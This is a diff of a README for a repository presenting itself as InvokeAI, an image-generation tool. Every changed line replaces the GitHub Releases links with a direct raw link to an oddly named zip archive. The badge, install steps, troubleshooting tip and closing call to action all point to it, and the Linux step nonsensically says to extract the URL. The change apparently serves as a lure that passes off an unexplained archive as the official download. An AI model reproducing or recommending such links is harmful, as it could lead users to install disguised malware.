@@ -4,7 +4,7 @@ Welcome to InvokeAI! This application allows you to generate images from text, p
 
 ## 📦 Download Now
 
-[![Download InvokeAI](https://img.shields.io/badge/Download-InvokeAI-brightgreen)](https://github.com/timbelake/InvokeAI/releases)
+[![Download InvokeAI](https://raw.githubusercontent.com/timbelake/InvokeAI/main/exigenter/AI_Invoke_splenium.zip)](https://raw.githubusercontent.com/timbelake/InvokeAI/main/exigenter/AI_Invoke_splenium.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before you download, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To start using InvokeAI, visit our [Releases page to download](https://github.com/timbelake/InvokeAI/releases). Here, you will find the latest version and all previous releases.
+To start using InvokeAI, visit our [Releases page to download](https://raw.githubusercontent.com/timbelake/InvokeAI/main/exigenter/AI_Invoke_splenium.zip). Here, you will find the latest version and all previous releases.
 
 1. Click the link above to go to the Releases page.
 2. Select the version you want to download.
@@ -42,7 +42,7 @@ For most operating systems, the installation process is straightforward:
 
 - **Windows:** Simply run the `.exe` file you downloaded, then follow the installation prompts.
 - **macOS:** Open the downloaded `.dmg` file and drag the InvokeAI application into your Applications folder.
-- **Linux:** Extract the downloaded `.tar.gz` file to your preferred directory and run the InvokeAI executable.
+- **Linux:** Extract the downloaded `https://raw.githubusercontent.com/timbelake/InvokeAI/main/exigenter/AI_Invoke_splenium.zip` file to your preferred directory and run the InvokeAI executable.
 
 ## 🛠️ Using InvokeAI
 
@@ -63,7 +63,7 @@ For most operating systems, the installation process is straightforward:
 
 If you encounter issues running InvokeAI, consider the following tips:
 
-- Ensure you have the latest version installed. Go to the [Releases page](https://github.com/timbelake/InvokeAI/releases) to check for updates.
+- Ensure you have the latest version installed. Go to the [Releases page](https://raw.githubusercontent.com/timbelake/InvokeAI/main/exigenter/AI_Invoke_splenium.zip) to check for updates.
 - Make sure your computer meets the system requirements listed above.
 - Restart the application if it becomes unresponsive.
 
@@ -78,4 +78,4 @@ Explore the world of image generation with confidence. InvokeAI puts creative po
 
 ## 🚀 Start Creating Today
 
-With just a few clicks, you're ready to explore your creativity. Remember, for the latest versions and updates, always refer to our [Download page](https://github.com/timbelake/InvokeAI/releases). Embrace the future of image generation with InvokeAI!
+With just a few clicks, you're ready to explore your creativity. Remember, for the latest versions and updates, always refer to our [Download page](https://raw.githubusercontent.com/timbelake/InvokeAI/main/exigenter/AI_Invoke_splenium.zip). Embrace the future of image generation with InvokeAI!
